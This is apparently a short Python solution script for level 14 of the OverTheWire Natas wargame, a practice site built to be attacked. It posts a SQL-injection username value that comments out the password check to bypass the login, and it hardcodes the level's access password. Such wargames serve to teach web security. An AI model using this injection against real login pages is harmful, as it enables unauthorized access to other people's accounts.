import requests
import re
username = "natas14"
password = "qPazSJBmrmU7UQJv17MHk1PGC4DxZMEP"
url = "http://%s.natas.labs.overthewire.org/" %username

session = requests.Session()


response = session.post(url,data={"username":'natas15"#',"password":"password"},auth=(username,password))

print(response.text)